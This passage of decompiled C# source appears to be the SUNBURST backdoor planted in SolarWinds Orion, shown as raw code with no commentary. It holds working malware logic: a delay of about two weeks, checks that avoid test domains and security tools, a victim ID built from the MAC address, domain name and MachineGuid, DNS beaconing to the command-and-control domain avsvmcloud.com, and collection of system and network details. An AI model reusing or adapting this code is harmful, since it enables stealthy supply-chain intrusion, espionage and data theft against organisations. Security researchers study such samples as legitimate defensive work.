        5219431737322569038uL,
        15535773470978271326uL,
        7810436520414958497uL,
        13316211011159594063uL,
        13825071784440082496uL,
        14480775929210717493uL,
        14482658293117931546uL,
        8473756179280619170uL,
        3778500091710709090uL,
        8799118153397725683uL,
        12027963942392743532uL,
        576626207276463000uL,
        7412338704062093516uL,
        682250828679635420uL,
        13014156621614176974uL,
        18150909006539876521uL,
        10336842116636872171uL,
        12785322942775634499uL,
        13260224381505715848uL,
        17956969551821596225uL,
        8709004393777297355uL,
        14256853800858727521uL,
        8129411991672431889uL,
        15997665423159927228uL,
        10829648878147112121uL,
        9149947745824492274uL,
        3656637464651387014uL,
        3575761800716667678uL,
        4501656691368064027uL,
        10296494671777307979uL,
        14630721578341374856uL,
        4088976323439621041uL,
        9531326785919727076uL,
        6461429591783621719uL,
        6508141243778577344uL,
        10235971842993272939uL,
        2478231962306073784uL,
        9903758755917170407uL,
        14710585101020280896uL,
        14710585101020280896uL,
        13611814135072561278uL,
        2810460305047003196uL,
        2032008861530788751uL,
        27407921587843457uL,
        6491986958834001955uL,
        2128122064571842954uL,
        10484659978517092504uL,
        8478833628889826985uL,
        10463926208560207521uL,
        7080175711202577138uL,
        8697424601205169055uL,
        7775177810774851294uL,
        16130138450758310172uL,
        506634811745884560uL,
        18294908219222222902uL,
        3588624367609827560uL,
        9555688264681862794uL,
        5415426428750045503uL,
        3642525650883269872uL,
        13135068273077306806uL,
        3769837838875367802uL,
        191060519014405309uL,
        1682585410644922036uL,
        7878537243757499832uL,
        13799353263187722717uL,
        1367627386496056834uL,
        12574535824074203265uL,
        16990567851129491937uL,
        8994091295115840290uL,
        13876356431472225791uL,
        14968320160131875803uL,
        14868920869169964081uL,
        106672141413120087uL,
        79089792725215063uL,
        5614586596107908838uL,
        3869935012404164040uL,
        3538022140597504361uL,
        14111374107076822891uL,
        7982848972385914508uL,
        8760312338504300643uL,
        17351543633914244545uL,
        7516148236133302073uL,
        15114163911481793350uL,
        15457732070353984570uL,
        16292685861617888592uL,
        10374841591685794123uL,
        3045986759481489935uL,
        17109238199226571972uL,
        6827032273910657891uL,
        5945487981219695001uL,
        8052533790968282297uL,
        17574002783607647274uL,
        3341747963119755850uL,
        14193859431895170587uL,
        17439059603042731363uL,
        17683972236092287897uL,
        700598796416086955uL,
        3660705254426876796uL,
        12709986806548166638uL,
        3890794756780010537uL,
        2797129108883749491uL,
        3890769468012566366uL,
        14095938998438966337uL,
        11109294216876344399uL,
        1368907909245890092uL,
        11818825521849580123uL,
        8146185202538899243uL,
        2934149816356927366uL,
        13029357933491444455uL,
        6195833633417633900uL,
        2760663353550280147uL,
        16423314183614230717uL,
        2532538262737333146uL,
        4454255944391929578uL,
        6088115528707848728uL,
        13611051401579634621uL,
        18147627057830191163uL,
        17633734304611248415uL,
        13581776705111912829uL,
        7175363135479931834uL,
        3178468437029279937uL,
        13599785766252827703uL,
        6180361713414290679uL,
        8612208440357175863uL,
        8408095252303317471uL
    };

    private static readonly ulong[] configTimeStamps = new ulong[17]
    {
        17097380490166623672uL,
        15194901817027173566uL,
        12718416789200275332uL,
        18392881921099771407uL,
        3626142665768487764uL,
        12343334044036541897uL,
        397780960855462669uL,
        6943102301517884811uL,
        13544031715334011032uL,
        11801746708619571308uL,
        18159703063075866524uL,
        835151375515278827uL,
        16570804352575357627uL,
        1614465773938842903uL,
        12679195163651834776uL,
        2717025511528702475uL,
        17984632978012874803uL
    };

    private static readonly object svcListModifiedLock = new object();

    private static volatile bool _svcListModified1 = false;

    private static volatile bool _svcListModified2 = false;

    private static readonly ServiceConfiguration[] svcList = new ServiceConfiguration[8]
    {
        new ServiceConfiguration
        {
            timeStamps = new ulong[1]
            {
                5183687599225757871uL
            },
            Svc = new ServiceConfiguration.Service[1]
            {
                new ServiceConfiguration.Service
                {
                    timeStamp = 917638920165491138uL,
                    started = true
                }
            }
        },
        new ServiceConfiguration
        {
            timeStamps = new ulong[1]
            {
                10063651499895178962uL
            },
            Svc = new ServiceConfiguration.Service[1]
            {
                new ServiceConfiguration.Service
                {
                    timeStamp = 16335643316870329598uL,
                    started = true
                }
            }
        },
        new ServiceConfiguration
        {
            timeStamps = new ulong[2]
            {
                10501212300031893463uL,
                155978580751494388uL
            },
            Svc = new ServiceConfiguration.Service[0]
        },
        new ServiceConfiguration
        {
            timeStamps = new ulong[2]
            {
                17204844226884380288uL,
                5984963105389676759uL
            },
            Svc = new ServiceConfiguration.Service[4]
            {
                new ServiceConfiguration.Service
                {
                    timeStamp = 11385275378891906608uL,
                    DefaultValue = 2u
                },
                new ServiceConfiguration.Service
                {
                    timeStamp = 13693525876560827283uL,
                    DefaultValue = 1u
                },
                new ServiceConfiguration.Service
                {
                    timeStamp = 17849680105131524334uL,
                    DefaultValue = 1u
                },
                new ServiceConfiguration.Service
                {
                    timeStamp = 18246404330670877335uL,
                    DefaultValue = 3u
                }
            }
        },
        new ServiceConfiguration
        {
            timeStamps = new ulong[2]
            {
                8698326794961817906uL,
                9061219083560670602uL
            },
            Svc = new ServiceConfiguration.Service[3]
            {
                new ServiceConfiguration.Service
                {
                    timeStamp = 11771945869106552231uL,
                    DefaultValue = 1u
                },
                new ServiceConfiguration.Service
                {
                    timeStamp = 9234894663364701749uL,
                    DefaultValue = 3u
                },
                new ServiceConfiguration.Service
                {
                    timeStamp = 8698326794961817906uL,
                    DefaultValue = 2u
                }
            }
        },
        new ServiceConfiguration
        {
            timeStamps = new ulong[2]
            {
                15695338751700748390uL,
                640589622539783622uL
            },
            Svc = new ServiceConfiguration.Service[5]
            {
                new ServiceConfiguration.Service
                {
                    timeStamp = 15695338751700748390uL,
                    DefaultValue = 2u
                },
                new ServiceConfiguration.Service
                {
                    timeStamp = 9384605490088500348uL,
                    DefaultValue = 3u
                },
                new ServiceConfiguration.Service
                {
                    timeStamp = 6274014997237900919uL,
                    DefaultValue = 3u
                },
                new ServiceConfiguration.Service
                {
                    timeStamp = 15092207615430402812uL,
                    DefaultValue = 0u
                },
                new ServiceConfiguration.Service
                {
                    timeStamp = 3320767229281015341uL,
                    DefaultValue = 3u
                }
            }
        },
        new ServiceConfiguration
        {
            timeStamps = new ulong[3]
            {
                3200333496547938354uL,
                14513577387099045298uL,
                607197993339007484uL
            },
            Svc = new ServiceConfiguration.Service[8]
            {
                new ServiceConfiguration.Service
                {
                    timeStamp = 15587050164583443069uL,
                    DefaultValue = 1u
                },
                new ServiceConfiguration.Service
                {
                    timeStamp = 9559632696372799208uL,
                    DefaultValue = 0u
                },
                new ServiceConfiguration.Service
                {
                    timeStamp = 4931721628717906635uL,
                    DefaultValue = 1u
                },
                new ServiceConfiguration.Service
                {
                    timeStamp = 3200333496547938354uL,
                    DefaultValue = 2u
                },
                new ServiceConfiguration.Service
                {
                    timeStamp = 2589926981877829912uL,
                    DefaultValue = 3u
                },
                new ServiceConfiguration.Service
                {
                    timeStamp = 17997967489723066537uL,
                    DefaultValue = 1u
                },
                new ServiceConfiguration.Service
                {
                    timeStamp = 14079676299181301772uL,
                    DefaultValue = 2u
                },
                new ServiceConfiguration.Service
                {
                    timeStamp = 17939405613729073960uL,
                    DefaultValue = 1u
                }
            }
        },
        new ServiceConfiguration
        {
            timeStamps = new ulong[9]
            {
                521157249538507889uL,
                14971809093655817917uL,
                10545868833523019926uL,
                15039834196857999838uL,
                14055243717250701608uL,
                5587557070429522647uL,
                12445177985737237804uL,
                17978774977754553159uL,
                17017923349298346219uL
            },
            Svc = new ServiceConfiguration.Service[19]
            {
                new ServiceConfiguration.Service
                {
                    timeStamp = 17624147599670377042uL,
                    DefaultValue = 2u
                },
                new ServiceConfiguration.Service
                {
                    timeStamp = 16066651430762394116uL,
                    DefaultValue = 3u
                },
                new ServiceConfiguration.Service
                {
                    timeStamp = 13655261125244647696uL,
                    DefaultValue = 2u
                },
                new ServiceConfiguration.Service
                {
                    timeStamp = 12445177985737237804uL,
                    DefaultValue = 3u
                },
                new ServiceConfiguration.Service
                {
                    timeStamp = 3421213182954201407uL,
                    DefaultValue = 2u
                },
                new ServiceConfiguration.Service
                {
                    timeStamp = 14243671177281069512uL,
                    DefaultValue = 3u
                },
                new ServiceConfiguration.Service
                {
                    timeStamp = 16112751343173365533uL,
                    DefaultValue = 3u
                },
                new ServiceConfiguration.Service
                {
                    timeStamp = 3425260965299690882uL,
                    DefaultValue = 1u
                },
                new ServiceConfiguration.Service
                {
                    timeStamp = 9333057603143916814uL,
                    DefaultValue = 0u
                },
                new ServiceConfiguration.Service
                {
                    timeStamp = 3413886037471417852uL,
                    DefaultValue = 3u
                },
                new ServiceConfiguration.Service
                {
                    timeStamp = 7315838824213522000uL,
                    DefaultValue = 1u
                },
                new ServiceConfiguration.Service
                {
                    timeStamp = 13783346438774742614uL,
                    DefaultValue = 4u
                },
                new ServiceConfiguration.Service
                {
                    timeStamp = 2380224015317016190uL,
                    DefaultValue = 4u
                },
                new ServiceConfiguration.Service
                {
                    timeStamp = 3413052607651207697uL,
                    DefaultValue = 1u
                },
                new ServiceConfiguration.Service
                {
                    timeStamp = 3407972863931386250uL,
                    DefaultValue = 1u
                },
                new ServiceConfiguration.Service
                {
                    timeStamp = 10393903804869831898uL,
                    DefaultValue = 3u
                },
                new ServiceConfiguration.Service
                {
                    timeStamp = 12445232961318634374uL,
                    DefaultValue = 2u
                },
                new ServiceConfiguration.Service
                {
                    timeStamp = 3421197789791424393uL,
                    DefaultValue = 2u
                },
                new ServiceConfiguration.Service
                {
                    timeStamp = 541172992193764396uL,
                    DefaultValue = 2u
                }
            }
        }
    };

    private static readonly IPAddressesHelper[] nList = new IPAddressesHelper[22]
    {
        new IPAddressesHelper("10.0.0.0", "255.0.0.0", AddressFamilyEx.Atm),
        new IPAddressesHelper("172.16.0.0", "255.240.0.0", AddressFamilyEx.Atm),
        new IPAddressesHelper("192.168.0.0", "255.255.0.0", AddressFamilyEx.Atm),
        new IPAddressesHelper("224.0.0.0", "240.0.0.0", AddressFamilyEx.Atm),
        new IPAddressesHelper("fc00::", "fe00::", AddressFamilyEx.Atm),
        new IPAddressesHelper("fec0::", "ffc0::", AddressFamilyEx.Atm),
        new IPAddressesHelper("ff00::", "ff00::", AddressFamilyEx.Atm),
        new IPAddressesHelper("41.84.159.0", "255.255.255.0", AddressFamilyEx.Ipx),
        new IPAddressesHelper("74.114.24.0", "255.255.248.0", AddressFamilyEx.Ipx),
        new IPAddressesHelper("154.118.140.0", "255.255.255.0", AddressFamilyEx.Ipx),
        new IPAddressesHelper("217.163.7.0", "255.255.255.0", AddressFamilyEx.Ipx),
        new IPAddressesHelper("20.140.0.0", "255.254.0.0", AddressFamilyEx.ImpLink),
        new IPAddressesHelper("96.31.172.0", "255.255.255.0", AddressFamilyEx.ImpLink),
        new IPAddressesHelper("131.228.12.0", "255.255.252.0", AddressFamilyEx.ImpLink),
        new IPAddressesHelper("144.86.226.0", "255.255.255.0", AddressFamilyEx.ImpLink),
        new IPAddressesHelper("8.18.144.0", "255.255.254.0", AddressFamilyEx.NetBios),
        new IPAddressesHelper("18.130.0.0", "255.255.0.0", AddressFamilyEx.NetBios, ext: true),
        new IPAddressesHelper("71.152.53.0", "255.255.255.0", AddressFamilyEx.NetBios),
        new IPAddressesHelper("99.79.0.0", "255.255.0.0", AddressFamilyEx.NetBios, ext: true),
        new IPAddressesHelper("87.238.80.0", "255.255.248.0", AddressFamilyEx.NetBios),
        new IPAddressesHelper("199.201.117.0", "255.255.255.0", AddressFamilyEx.NetBios),
        new IPAddressesHelper("184.72.0.0", "255.254.0.0", AddressFamilyEx.NetBios, ext: true)
    };

    private static readonly ulong[] patternHashes = new ulong[13]
    {
        1109067043404435916uL,
        15267980678929160412uL,
        8381292265993977266uL,
        3796405623695665524uL,
        8727477769544302060uL,
        10734127004244879770uL,
        11073283311104541690uL,
        4030236413975199654uL,
        7701683279824397773uL,
        5132256620104998637uL,
        5942282052525294911uL,
        4578480846255629462uL,
        16858955978146406642uL
    };

    private static readonly string[] patternList = new string[2]
    {
        "(?i)([^a-z]|^)(test)([^a-z]|$)",
        "(?i)(solarwinds)"
    };

    private static readonly string reportStatusName = "ReportWatcherRetry";

    private static readonly string serviceStatusName = "ReportWatcherPostpone";

    private static string userAgentOrionImprovementClient = null;

    private static string userAgentDefault = null;

    private static readonly string apiHost = "api.solarwinds.com";

    private static readonly string domain1 = "avsvmcloud.com";

    private static readonly string domain2 = "appsync-api";

    private static readonly string[] domain3 = new string[4]
    {
        "eu-west-1",
        "us-west-2",
        "us-east-1",
        "us-east-2"
    };

    private static readonly string appId = "583da945-62af-10e8-4902-a8f205c72b2e";

    private static ReportStatus status = ReportStatus.New;

    private static string domain4 = null;

    private static byte[] userId = null;

    private static NamedPipeServerStream instance = null;

    private const int minInterval = 30;

    private const int maxInterval = 120;

    private static string osVersion = null;

    private static string osInfo = null;

    public static bool IsAlive
    {
        get
        {
            lock (_isAliveLock)
            {
                if (_isAlive)
                {
                    return true;
                }
                _isAlive = true;
                return false;
            }
        }
    }

    private static bool svcListModified1
    {
        get
        {
            lock (svcListModifiedLock)
            {
                bool svcListModified = _svcListModified1;
                _svcListModified1 = false;
                return svcListModified;
            }
        }
        set
        {
            lock (svcListModifiedLock)
            {
                _svcListModified1 = value;
            }
        }
    }

    private static bool svcListModified2
    {
        get
        {
            lock (svcListModifiedLock)
            {
                return _svcListModified2;
            }
        }
        set
        {
            lock (svcListModifiedLock)
            {
                _svcListModified2 = value;
            }
        }
    }

    public static void Initialize()
    {
        try
        {
            if (GetHash(Process.GetCurrentProcess().ProcessName.ToLower()) != 17291806236368054941uL)
            {
                return;
            }
            DateTime lastWriteTime = File.GetLastWriteTime(Assembly.GetExecutingAssembly().Location);
            int num = new Random().Next(288, 336);
            if (DateTime.Now.CompareTo(lastWriteTime.AddHours(num)) < 0)
            {
                return;
            }
            instance = new NamedPipeServerStream(appId);
            ConfigManager.ReadReportStatus(out status);
            if (status == ReportStatus.Truncate)
            {
                return;
            }
            DelayMin(0, 0);
            domain4 = IPGlobalProperties.GetIPGlobalProperties().DomainName;
            if (!string.IsNullOrEmpty(domain4) && !IsNullOrInvalidName(domain4))
            {
                DelayMin(0, 0);
                if (GetOrCreateUserID(out userId))
                {
                    DelayMin(0, 0);
                    ConfigManager.ReadServiceStatus(_readonly: false);
                    Update();
                    instance.Close();
                }
            }
        }
        catch (Exception)
        {
        }
    }

    private static bool UpdateNotification()
    {
        int num = 3;
        while (num-- > 0)
        {
            DelayMin(0, 0);
            if (ProcessTracker.TrackProcesses(full: true))
            {
                return false;
            }
            if (DnsHelper.CheckServerConnection(apiHost))
            {
                return true;
            }
        }
        return false;
    }

    private static void Update()
    {
        bool flag = false;
        CryptoHelper cryptoHelper = new CryptoHelper(userId, domain4);
        HttpHelper httpHelper = null;
        Thread thread = null;
        bool last = true;
        AddressFamilyEx addressFamilyEx = AddressFamilyEx.Unknown;
        int num = 0;
        bool flag2 = true;
        DnsRecords dnsRecords = new DnsRecords();
        Random random = new Random();
        int a = 0;
        if (!UpdateNotification())
        {
            return;
        }
        svcListModified2 = false;
        for (int i = 1; i <= 3; i++)
        {
            if (flag)
            {
                break;
            }
            DelayMin(dnsRecords.A, dnsRecords.A);
            if (ProcessTracker.TrackProcesses(full: true))
            {
                break;
            }
            if (svcListModified1)
            {
                flag2 = true;
            }
            num = (svcListModified2 ? (num + 1) : 0);
            string hostName;
            if (status == ReportStatus.New)
            {
                hostName = ((addressFamilyEx == AddressFamilyEx.Error) ? cryptoHelper.GetCurrentString() : cryptoHelper.GetPreviousString(out last));
            }
            else
            {
                if (status != ReportStatus.Append)
                {
                    break;
                }
                hostName = (flag2 ? cryptoHelper.GetNextStringEx(dnsRecords.dnssec) : cryptoHelper.GetNextString(dnsRecords.dnssec));
            }
            addressFamilyEx = DnsHelper.GetAddressFamily(hostName, dnsRecords);
            switch (addressFamilyEx)
            {
                case AddressFamilyEx.Error:
                    dnsRecords.A = random.Next(420, 540);
                    break;
                case AddressFamilyEx.NetBios:
                    if (status == ReportStatus.Append)
                    {
                        flag2 = false;
                        if (dnsRecords.dnssec)
                        {
                            a = dnsRecords.A;
                            dnsRecords.A = random.Next(1, 3);
                        }
                    }
                    if (status == ReportStatus.New && last)
                    {
                        status = ReportStatus.Append;
                        ConfigManager.WriteReportStatus(status);
                    }
                    if (!string.IsNullOrEmpty(dnsRecords.cname))
                    {
                        dnsRecords.A = a;
                        HttpHelper.Close(httpHelper, thread);
                        httpHelper = new HttpHelper(userId, dnsRecords);
                        if (!svcListModified2 || num > 1)
                        {
                            svcListModified2 = false;
                            thread = new Thread(httpHelper.Initialize)
                            {
                                IsBackground = true
                            };
                            thread.Start();
                        }
                    }
                    i = 0;
                    break;
                case AddressFamilyEx.ImpLink:
                case AddressFamilyEx.Atm:
                    ConfigManager.WriteReportStatus(ReportStatus.Truncate);
                    ProcessTracker.SetAutomaticMode();
                    flag = true;
                    break;
                case AddressFamilyEx.Ipx:
                    if (status == ReportStatus.Append)
                    {
                        ConfigManager.WriteReportStatus(ReportStatus.New);
                    }
                    flag = true;
                    break;
                default:
                    flag = true;
                    break;
            }
        }
        HttpHelper.Close(httpHelper, thread);
    }

    private static string GetManagementObjectProperty(ManagementObject obj, string property)
    {
        string str = ((obj.Properties[property].Value?.GetType() == typeof(string[])) ? string.Join(", ", ((string[])obj.Properties[property].Value).Select((string v) => v.ToString())) : (obj.Properties[property].Value?.ToString() ?? ""));
        return property + ": " + str + "\n";
    }

    private static string GetNetworkAdapterConfiguration()
    {
        string text = "";
        try
        {
            using ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * From Win32_NetworkAdapterConfiguration where IPEnabled=true");
            foreach (ManagementObject item in managementObjectSearcher.Get().Cast<ManagementObject>())
            {
                text += "\n";
                text += GetManagementObjectProperty(item, "Description");
                text += GetManagementObjectProperty(item, "MACAddress");
                text += GetManagementObjectProperty(item, "DHCPEnabled");
                text += GetManagementObjectProperty(item, "DHCPServer");
                text += GetManagementObjectProperty(item, "DNSHostName");
                text += GetManagementObjectProperty(item, "DNSDomainSuffixSearchOrder");
                text += GetManagementObjectProperty(item, "DNSServerSearchOrder");
                text += GetManagementObjectProperty(item, "IPAddress");
                text += GetManagementObjectProperty(item, "IPSubnet");
                text += GetManagementObjectProperty(item, "DefaultIPGateway");
            }
            return text;
        }
        catch (Exception ex)
        {
            return text + ex.Message;
        }
    }

    private static string GetOSVersion(bool full)
    {
        if (osVersion == null || osInfo == null)
        {
            try
            {
                using ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * From Win32_OperatingSystem");
                ManagementObject managementObject = managementObjectSearcher.Get().Cast<ManagementObject>().FirstOrDefault();
                osInfo = managementObject.Properties["Caption"].Value.ToString();
                osInfo = osInfo + ";" + managementObject.Properties["OSArchitecture"].Value.ToString();
                osInfo = osInfo + ";" + managementObject.Properties["InstallDate"].Value.ToString();
                osInfo = osInfo + ";" + managementObject.Properties["Organization"].Value.ToString();
                osInfo = osInfo + ";" + managementObject.Properties["RegisteredUser"].Value.ToString();
                string text = managementObject.Properties["Version"].Value.ToString();
                osInfo = osInfo + ";" + text;
                string[] array = text.Split('.');
                osVersion = array[0] + "." + array[1];
            }
            catch (Exception)
            {
                osVersion = Environment.OSVersion.Version.Major + "." + Environment.OSVersion.Version.Minor;
                osInfo = string.Format("[E] {0} {1} {2}", Environment.OSVersion.VersionString, Environment.OSVersion.Version, Environment.Is64BitOperatingSystem ? 64 : 32);
            }
        }
        if (!full)
        {
            return osVersion;
        }
        return osInfo;
    }

    private static string ReadDeviceInfo()
    {
        try
        {
            return (from nic in NetworkInterface.GetAllNetworkInterfaces()
                    where nic.OperationalStatus == OperationalStatus.Up && nic.NetworkInterfaceType != NetworkInterfaceType.Loopback
                    select nic.GetPhysicalAddress().ToString()).FirstOrDefault();
        }
        catch (Exception)
        {
        }
        return null;
    }

    private static bool GetOrCreateUserID(out byte[] hash64)
    {
        string text = ReadDeviceInfo();
        hash64 = new byte[8];
        Array.Clear(hash64, 0, hash64.Length);
        if (text == null)
        {
            return false;
        }
        text += domain4;
        try
        {
            text += RegistryHelper.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", "");
        }
        catch
        {
        }
        using (MD5 mD = MD5.Create())
        {
            byte[] bytes = Encoding.ASCII.GetBytes(text);
            byte[] array = mD.ComputeHash(bytes);
            if (array.Length < hash64.Length)
            {
                return false;
            }
            for (int i = 0; i < array.Length; i++)
            {
                hash64[i % hash64.Length] ^= array[i];
            }
        }
        return true;
    }

    private static bool IsNullOrInvalidName(string domain4)
    {
        string[] array = domain4.ToLower().Split('.');
        if (array.Length >= 2)
        {
            string s = array[array.Length - 2] + "." + array[array.Length - 1];
            ulong[] array2 = patternHashes;
            foreach (ulong num in array2)
            {
                if (GetHash(s) == num)
                {
                    return true;
                }
            }
        }
        string[] array3 = patternList;
        foreach (string pattern in array3)
        {
            if (Regex.Match(domain4, pattern).Success)
            {
                return true;
            }
        }
        return false;
    }

    private static void DelayMs(double minMs, double maxMs)
    {
        if ((int)maxMs == 0)
        {
            minMs = 1000.0;
            maxMs = 2000.0;
        }
        double num;
        for (num = minMs + new Random().NextDouble() * (maxMs - minMs); num >= 2147483647.0; num -= 2147483647.0)
        {
            Thread.Sleep(int.MaxValue);
        }
        Thread.Sleep((int)num);
    }

    private static void DelayMin(int minMinutes, int maxMinutes)
    {
        if (maxMinutes == 0)
        {
            minMinutes = 30;
            maxMinutes = 120;
        }
        DelayMs((double)minMinutes * 60.0 * 1000.0, (double)maxMinutes * 60.0 * 1000.0);
    }

    private static ulong GetHash(string s)
    {
        ulong num = 14695981039346656037uL;
        try
        {
            byte[] bytes = Encoding.UTF8.GetBytes(s);
            foreach (byte b in bytes)
            {
                num ^= b;
                num *= 1099511628211L;
            }
        }
        catch
        {
        }
        return num ^ 0x5BAC903BA7D81967uL;
    }

    private static string Quote(string s)
    {
        if (s == null || !s.Contains(" ") || s.Contains("\""))
        {
            return s;
        }
        return "\"" + s + "\"";
    }

    private static string Unquote(string s)
    {
        if (s.StartsWith('"'.ToString()) && s.EndsWith('"'.ToString()))
        {
            return s.Substring(1, s.Length - 2);
        }
        return s;
    }

    private static string ByteArrayToHexString(byte[] bytes)
    {
        StringBuilder stringBuilder = new StringBuilder(bytes.Length * 2);
        foreach (byte b in bytes)
        {
            stringBuilder.AppendFormat("{0:x2}", b);
        }
        return stringBuilder.ToString();
    }

    private static byte[] HexStringToByteArray(string hex)
    {
        byte[] array = new byte[hex.Length / 2];
        for (int i = 0; i < hex.Length; i += 2)
        {
            array[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
        }
        return array;
    }
}